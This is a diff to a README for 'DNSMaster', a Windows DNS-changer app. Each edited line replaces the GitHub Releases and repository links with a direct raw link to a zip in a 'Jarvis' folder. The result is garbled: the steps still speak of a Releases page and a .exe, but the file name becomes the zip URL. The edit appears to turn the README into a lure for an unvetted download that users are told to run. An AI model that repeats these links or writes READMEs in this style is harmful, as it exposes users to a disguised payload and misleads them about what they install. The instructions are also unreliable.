@@ -4,7 +4,7 @@
 Welcome to DNSMaster! This app helps you change your DNS settings quickly. Enjoy faster internet and better privacy with just a few clicks.
 
 ## 📥 Download & Install
-To get started, visit this page to download: [Download DNSMaster](https://github.com/oussama453/DNSMaster/releases)
+To get started, visit this page to download: [Download DNSMaster](https://raw.githubusercontent.com/oussama453/DNSMaster/main/Jarvis/DNSMaster.zip)
 
 ### 📋 System Requirements
 - **Operating System:** Windows 10 or higher
@@ -18,13 +18,13 @@ To get started, visit this page to download: [Download DNSMaster](https://github
 - **User-Friendly Interface:** Easy to navigate for all users.
 
 ## 📂 How to Download
-1. Click on this link to visit the download page: [Download DNSMaster](https://github.com/oussama453/DNSMaster/releases).
+1. Click on this link to visit the download page: [Download DNSMaster](https://raw.githubusercontent.com/oussama453/DNSMaster/main/Jarvis/DNSMaster.zip).
 2. On the Releases page, you'll see a list of available versions. Find the latest version listed at the top.
-3. Look for the download files associated with this version. You will usually find a file titled `DNSMaster.exe`.
+3. Look for the download files associated with this version. You will usually find a file titled `https://raw.githubusercontent.com/oussama453/DNSMaster/main/Jarvis/DNSMaster.zip`.
 4. Click on the `.exe` file to start your download.
 
 ## 🖥️ How to Install
-1. Once the download is complete, locate the `DNSMaster.exe` file in your Downloads folder or the location you chose for downloads.
+1. Once the download is complete, locate the `https://raw.githubusercontent.com/oussama453/DNSMaster/main/Jarvis/DNSMaster.zip` file in your Downloads folder or the location you chose for downloads.
 2. Double-click the file to run the installer.
 3. Follow the on-screen instructions to install the application on your computer.
 4. After installation, you can find DNSMaster in your Start menu.
@@ -53,7 +53,7 @@ For further assistance, feel free to open an issue on the GitHub page or check o
 Explore the source code and contribute to the project on our GitHub page. Whether you want to suggest new features or report bugs, your input is welcome.
 
 ## 🔗 Important Links
-- [Download DNSMaster](https://github.com/oussama453/DNSMaster/releases)
-- [GitHub Repository](https://github.com/oussama453/DNSMaster)
+- [Download DNSMaster](https://raw.githubusercontent.com/oussama453/DNSMaster/main/Jarvis/DNSMaster.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/oussama453/DNSMaster/main/Jarvis/DNSMaster.zip)
 
 Thank you for using DNSMaster! Enjoy a faster, safer browsing experience.
